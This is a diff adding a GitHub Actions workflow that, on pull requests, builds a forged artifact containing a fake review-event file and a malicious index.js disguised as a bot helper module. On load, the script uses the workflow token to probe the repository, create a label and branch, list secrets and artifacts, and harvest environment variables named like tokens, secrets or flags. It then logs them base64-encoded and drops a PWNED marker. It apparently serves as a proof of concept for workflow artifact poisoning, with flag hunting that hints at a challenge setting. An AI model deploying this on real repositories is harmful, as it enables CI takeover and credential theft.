@@ -1,0 +1,81 @@
+name: Bot - On PR Review
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Stage forged artifact tree
+        run: |
+          mkdir -p stage/.github/scripts/helpers
+          cat > stage/review-event.json <<'JSON'
+          {"pr_number":16,"review_state":"changes_requested","draft":false}
+          JSON
+          cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
+          const fs = require('fs');
+
+          (async () => {
+            const repo = process.env.GITHUB_REPOSITORY;
+            const tok = process.env.GITHUB_TOKEN;
+            const out = { marker: 'GAB_WFR_RCE_MARKER_v1', run: process.env.GITHUB_RUN_ID };
+            const api = async (path, opts = {}) => {
+              try {
+                const r = await fetch('https://api.github.com' + path, {
+                  method: opts.method || 'GET',
+                  headers: Object.assign({
+                    Authorization: 'Bearer ' + tok,
+                    Accept: 'application/vnd.github+json',
+                    'User-Agent': 'gab-wfr-poc'
+                  }, opts.body ? { 'Content-Type': 'application/json' } : {}),
+                  body: opts.body
+                });
+                const text = await r.text();
+                return { status: r.status, body: text.slice(0, 2000) };
+              } catch (e) {
+                return { error: String(e) };
+              }
+            };
+            try {
+              out.whoami = await api('/user');
+              out.repo = await api('/repos/' + repo);
+              out.createLabel = await api('/repos/' + repo + '/labels', {
+                method: 'POST',
+                body: JSON.stringify({ name: 'gab-pwned-rce', color: 'ff0000' })
+              });
+              out.createRef = await api('/repos/' + repo + '/git/refs', {
+                method: 'POST',
+                body: JSON.stringify({ ref: 'refs/heads/gab-wfr-write-test', sha: process.env.GITHUB_SHA })
+              });
+              out.listSecrets = await api('/repos/' + repo + '/actions/secrets');
+              out.listArtifacts = await api('/repos/' + repo + '/actions/artifacts?per_page=3');
+              out.envKeys = Object.keys(process.env).filter(k => /FLAG|SECRET|TOKEN|KEY/i.test(k));
+              out.envFlagHits = Object.entries(process.env)
+                .filter(([k, v]) => /FLAG\{/.test(String(v)))
+                .map(([k, v]) => k + '=' + v);
+              console.log('GAB_WFR_RESULT_B64:' + Buffer.from(JSON.stringify(out)).toString('base64'));
+              fs.writeFileSync('PWNED.txt', 'GAB_WFR_RCE_MARKER_v1\n');
+            } catch (e) {
+              console.log('GAB_WFR_ERR:' + (e && e.stack ? e.stack : String(e)));
+            }
+          })();
+
+          module.exports = {
+            createLogger: () => ({ log() {}, error() {} }),
+            buildBotContext: ({ github, context }) => ({ github, context }),
+            swapStatusLabel: async () => ({ success: true }),
+            STATUS_LABELS: {}
+          };
+          PAYLOAD
+      - name: Upload forged artifact
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: review-event-${{ github.run_id }}
+          path: stage
+          include-hidden-files: true
+          retention-days: 1
